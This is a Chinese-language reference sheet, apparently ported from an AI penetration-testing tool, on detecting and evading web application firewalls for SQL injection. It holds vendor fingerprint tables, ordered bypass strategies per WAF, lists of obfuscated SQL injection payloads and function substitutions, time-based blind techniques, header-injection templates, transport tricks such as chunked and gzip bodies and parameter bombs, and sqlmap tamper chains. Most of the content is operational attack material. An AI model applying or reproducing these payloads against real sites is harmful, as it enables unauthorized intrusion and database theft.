# WAF Bypass Master — 从 bingo v7.0.66 移植 (waf_bypass.py + waf_sqli_payloads.py + sqli_advanced.py)

来源: bingo AI 渗透终端武器库 (123k 行)。本文档是绕过层的核心资产。

## 1. WAF 签名库 (20+ 厂商，响应识别)

| WAF | 判定依据 (header/body/status) |
|---|---|
| Cloudflare | cf-ray header / body: cloudflare, "just a moment", __cf_bm / 403,503 |
| Nginx/OpenResty | server: nginx/openresty / body: "406 not acceptable" / 406,403 |
| ModSecurity | x-modsecurity header / "mod_security", "406 not" / 403,406 |
| AWS WAF | x-amzn-requestid header / body: aws, "request blocked" / 403 |
| Sucuri | body: sucuri, "website firewall" / 403 |
| Akamai | body: akamai, "reference #" / 403 |
| F5 BIG-IP | x-cnection header / "the requested url was rejected" / 403 |
| FortiWeb | body: fortiweb, "blocked by fortiweb" / 403 |
| Safe3(安全狗) | body: safe3waf, "safedog" / 403,200 |
| D盾 | body: d盾, "iis防火墙" / 403 |
| 云锁 | body: yunsuo, 云锁 / 403 |
| dotDefender | x-dotdefender-denied header / 403,200 |
| Imperva/Incapsula | x-iinfo header, incap_ses cookie / 403 |
| Wallarm | x-wallarm-request-id header / 403,500 |
| 360网站卫士 | body: 360wzws, 奇安信网站卫士 / 403 |
| 安全宝 | body: anquanbao / 403 |
| Nginx WAF | server: nginx + 400,403 |
| Wapples (KR, PIOLINK) | body: wapples / 韩文 "비정상적인 접근" |
| KISA (KR 공공) | body: KISA, "비정상적인 접근", "보안 정책" / 400 |
| generic | "access denied", "forbidden", "blocked" / 403,406,501 |

WAF 检测流程: 正常请求基线 → 5 个攻击探针 (?id=1' / UNION SELECT / <script> / ../ / SLEEP) → 403/406/501/503 或状态码 != 基线 → 按签名表识别。

## 2. 按 WAF 类型的优先绕过策略 (实战映射)

```
cloudflare:       encoding → unicode → ua → header → space → function
nginx_openresty:  newline(%0a) → mysql_comment(/**/) → space → keyword → function
modsecurity:      space → function → keyword → encoding → header
aws_waf:          encoding → function → header → space → keyword
sucuri:           ua → header → encoding → space
akamai:           encoding → header → space → unicode
f5_bigip:         space → keyword → encoding → function
fortiweb:         space → function → keyword → header
safe3/d盾/云锁/360/安全宝:  unicode → encoding → function → space
dotdefender:      header → space → keyword → chunked → encoding
imperva:          ua → header → encoding → space → function
wallarm:          function → encoding → space → keyword → header
wapples(KR):      korean_waf_bypass → space2comment → versionedmorekeywords
genian(KR):       korean_comment_bypass → space2hash → randomcase
cloudbric(KR):    korean_waf_bypass → space2mysqlblank → randomcomments
```

## 3. 九类绕过策略库 (WafBypassLib)

### 3.1 空格绕过 SPACE_BYPASSES
```
tab(\t) | %09 | %0a(newline, urimoney实战) | %0d%0a | /**/ (mysql_comment) | + | 删除 | /*!*/ (multi_comment)
```

### 3.2 关键字绕过 KEYWORD_BYPASSES
```
double_keyword:  select→selectselect (regex \b(select|union|and|or|where|from|order)\b ×2)
mixed_case:      SeLeCt 大小写交替
mysql_inline:    /*!SELECT*/ 版本内联注释
url_encode_keywords: select→%73elect
hex_encode:      'abc'→0x616263
char_function:   'abc'→CHAR(97,98,99)
```

### 3.3 编码绕过 ENCODING_BYPASSES
```
double_url_encode | html_entity (&lt; &gt;) | unicode_escape (%u0027) | base64
```

### 3.4 Header 伪造 HEADER_BYPASSES (10种)
```
X-Forwarded-For: 127.0.0.1 | X-Forwarded-For: 10.0.0.1 | X-Forwarded-For: 192.168.1.1
X-Real-IP | X-Originating-IP | X-Remote-IP: 127.0.0.1, 127.0.0.1 | X-Client-IP
True-Client-IP | Cluster-Client-IP | Forwarded: for=127.0.0.1;proto=https
```

### 3.5 UA 绕过 UA_BYPASSES
```
Googlebot/2.1 (+http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Chrome/120 标准 UA | curl/7.68.0 | python-requests/2.31.0 | sqlmap/1.7.8#stable
```

### 3.6 路径/参数变形 PATH_BYPASSES
```
double_slash(//) | dot_slash(/./) | url_encode_slash(%2f) | semicolon(;?) | null_byte(=%00) | HPP参数污染
```

### 3.7 SQL 函数替代 FUNCTION_BYPASSES (IF/SLEEP/BENCHMARK 被拦时)
```sql
-- IF(a,b,c) → CASE WHEN
CASE/**/WHEN/**/cond/**/THEN/**/a/**/ELSE/**/b/**/END
-- SLEEP(n) → heavy subquery (函数名消失)
(SELECT/**/1/**/FROM/**/(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,information_schema.columns/**/B)x)
-- BENCHMARK(n,expr) → 同样 heavy subquery
-- 数字比较 → GREATEST/LEAST
GREATEST(a,b)=a  (替代 a=b)
-- AND/OR → &&/||
-- UNION SELECT → UNION%0aSELECT
```

### 3.8 Unicode 绕过 UNICODE_BYPASSES
```
fullwidth_quote: ' → ＇ (" → ＂)     [全角]
overlong_slash:  / → %c0%af            [Overlong UTF-8]
null_byte_inject: SELECT→SELECT%00
html_entity_sel: SELECT→S&#69;LECT, UNION→UNI&#79;N, AND→AN&#68;
```

### 3.9 Chunked Transfer Encoding (POST 专用)
```
body 按 3/5/7/1 字节分块: {hex_len}\r\n{chunk}\r\n ... 0\r\n\r\n
headers: Transfer-Encoding: chunked + Content-Type: application/x-www-form-urlencoded
WAF 不重组 body 就漏检。
```

## 4. SQLi 函数替代大表 (waf_sqli_payloads.py — 被拦函数→替代)

```
SUBSTR: MID(str,pos,1) | RIGHT(LEFT(str,pos),1) | RIGHT(REVERSE(LEFT(REVERSE(str),rpos)),1)
        | LPAD(RPAD(str,pos,0x20),1,0x20) | TRIM(LEADING SUBSTR(str,1,pos1) FROM LEFT(str,pos))
        | INSERT(str,1,pos1,0x20) | CONVERT(SUBSTR(str,pos,1) USING utf8) | ELT(1,SUBSTR(...)) | IF(1=1,SUBSTR(...),0)
LEFT:   RIGHT(REVERSE(str),LENGTH(str)-n+1) | SUBSTR(str,1,n) | TRIM(TRAILING SUBSTR(str,n1,99) FROM str)
RIGHT:  SUBSTR(str,LENGTH(str)-n+1) | MID(str,-n)
ASCII:  ORD(char) | CONV(HEX(char),16,10) | WEIGHT_STRING(char AS CHAR(1) LEVEL 1)
        | FIND_IN_SET(char,CHAR(48,...57)) | STRCMP(char,CHAR(n))
DATABASE(): DATABASE/**/() | SCHEMA() | @@datadir | (SELECT schema_name FROM information_schema.schemata LIMIT 1)
VERSION(): VERSION/**/() | @@VERSION | @@version_comment
USER():   USER/**/() | CURRENT_USER() | @@global.hostname | SESSION_USER() | SYSTEM_USER()
空格:     /**/ | /*!*/ | %09 | %0a | %0d | %0b | %0c | +
"=":      LIKE | REGEXP | RLIKE | BETWEEN v AND v | IN(v) | NOT!= 
">":      GREATEST(a,b)=a | NOT BETWEEN 0 AND b | !<
"<":      LEAST(a,b)=a | BETWEEN 0 AND b | !>
INFORMATION_SCHEMA: information_schema/**/.tables | mysql.innodb_table_stats | sys.schema_tables | performance_schema.tables
SLEEP:    SLEEP/***/(n) | /*!SLEEP*/(n) | SLEEP%09(n) | BENCHMARK(50000000,MD5(1))
          | GET_LOCK(0x61,n) | WAIT_FOR_EXECUTED_GTID_SET('a',n)
          | pg_sleep(n) (PG) | WAITFOR DELAY '0:0:n' (MSSQL)
          | (SELECT count(*) FROM sqlite_master t1,t2,t3) (SQLite heavy)
SELECT:   SELECT/**/ | SE/**/LECT | %53ELECT | /*!50000SELECT*/
UNION:    UNION/**/ | UNION%0a | UNION%09 | UN/**/ION | /*!50000UNION*/
AND:      && | AND/**/ | %26%26 | AND%0a | /*!AND*/ | /*!12345AND*/ | AnD | AND%09
          | %09AND%09 | %00AND%00 | AND%0d%0a | XOR/**/0/**/OR | %2526%2526
OR:       || | OR/**/ | %7c%7c | OR%0a | /*!12345OR*/ | Or | OR%09 | %09OR%09 | %00OR%00 | OR%0d%0a | %257c%257c
```

## 5. RIGHT-only 字符提取策略 (SUBSTR/MID/ASCII/LEFT/ORD 全被拦，RIGHT 可用)

```
1. LIKE 模式: str LIKE 'k%'  (首字符判定，无函数名，最抗 WAF)
2. RIGHT+REVERSE: RIGHT(REVERSE(str),1) = 首字符
3. BETWEEN 二分: str BETWEEN 'a' AND 'm'
4. REGEXP: str REGEXP '^k' / '^ka'
5. FIND_IN_SET(LEFT(str,1),'k,a,c,p,r') > 0
```

## 6. 厂商级 tamper 策略 (sqli_advanced.py WAF_TAMPER_MAP)

```
cloudflare:  space2comment + randomcase + versionedmorekeywords + charencode
akamai:      space2randomblank + chardoubleencode + versionedmorekeywords
modsecurity: modsecurityversioned + space2comment + randomcase
f5bigip:     space2mssqlblank + charencode + randomcase
imperva:     securesphere + space2comment + versionedmorekeywords
nginx:       luanginx + space2plus + randomcase
gnuboard:    gnuboard_bypass('→\x27, "→\x22, SELECT→SELECT/**/) + space2comment + randomcase
韩国WAF特化: korean_waf_bypass: UNION→UNI%0aON, SELECT→SE%0aLECT, WHERE→WH%0aERE
            korean_comment_bypass: kw → /**//*!kw*//**/
```

## 7. 16 种 SQLi payload 变体生成器 (sqli_boolean STAGE2)

```
1. AND/OR → &&/||          2. 空格 → /**/
3. &&/|| + /**/ 组合         4. %26%26 / %7C%7C URL编码
5. 大小写混合 (AnD)         6. %0a 换行
7. /*!12345AND*/ 版本注释    8. %09 tab
9. 交替大小写 (aNd)         10. 双重URL编码 %2526
11. %00 NULL字节           12. AND 1=1 → AND/**/CASE/**/WHEN/**/1=1/**/THEN/**/1/**/ELSE/**/0/**/END
13. 全角 ＡＮＤ             14. 1=1 → 1e0=1e0 科学计数法
15. /**/AND/**/ 噪音        16. =1 → =0x31 HEX
```

## 8. 传输层绕过原语 (STAGE4-6)

```
HPP: ?id=1&id=payload (Imperva/F5 有效)
JSON body: {"id":[1,"payload"]} (AWS WAF 有效)
Multipart/form-data 参数传递
HTTP/2 请求 (Akamai 有效)
Chunked TE 分块
Cookie 注入 payload
gzip 压缩 POST: Content-Encoding: gzip (WAF 不解压即漏检)
参数炸弹: 500个 _x{i}=0 假参数撑爆 WAF 解析器
路径归一化: //page.php
HTTP3/QUIC
XML-SOAP body
```

## 9. Header 注入点模板 (SQLi via headers)

```
X-Forwarded-For: 127.0.0.1' {condition} --
User-Agent: Mozilla/5.0' {condition} -- -
Referer: https://www.google.com/search?q=1' {condition} -- -
X-Real-IP: 192.168.1.1' {condition} --
Accept-Language: ko-KR,ko' {condition} --
```

## 10. 多语言 SQL 错误检测 (防误报)

```
universal: "you have an error in your sql syntax", "unclosed quotation mark",
           "ora-[0-9]{5}", "microsoft.*odbc.*sql", "jdbc.*exception",
           "1064.*you have an error", "1054.*unknown column", "1146.*table.*doesn.*exist"
en: "sql error", "database error", "query failed", "syntax error"
ko: "sql 오류", "데이터베이스 오류", "쿼리 오류"
zh: "sql错误", "数据库错误", "查询失败", "语法错误"
ja: "sqlエラー", "データベースエラー", "構文エラー"
ru: "ошибка sql", "ошибка базы данных"
es: "error sql", "error de base de datos"
ar: "خطأ sql", "خطأ في قاعدة البيانات"

防误报排除 (FALSE_POSITIVE_PATTERNS — 命中即不是SQLi):
ko: "잘못된 접근", "존재하지 않는", "정상적인 접근이 아닙니다", "접근 권한이 없습니다"
en: "page not found", "access denied", "forbidden", "not authorized", "login required"
zh: "页面不存在", "访问被拒绝", "无权访问", "请先登录"
ja: "ページが見つかりません", "アクセスが拒否されました"
```

## 11. Error-based 三重防误报 (sqli_autoexploit STAGE2.5)

```
① baseline 中必须不存在分隔符 "~~"
② 验证 token 注入: EXTRACTVALUE(1,CONCAT(0x7e7e,0x<"BINGOVERIF"hex>)) 响应必须含该 token
③ XPATH 关键词不在 baseline
```

## 12. 其他实战经验

- 双 header WAF 识别: Cloudflare 必须 server:cloudflare + cf-ray 同时存在 (防 cdnjs 误报)
- 韩文 WAF 拦截特征: "비정상적인 접근", "차단되었습니다", "웹방화벽"
- 请求间隔 0.5~2s 随机延迟 (Akamai/IPS 速度检测)
- 会话 cookie (incap_ses) 必须保持，否则 Imperva 全拦
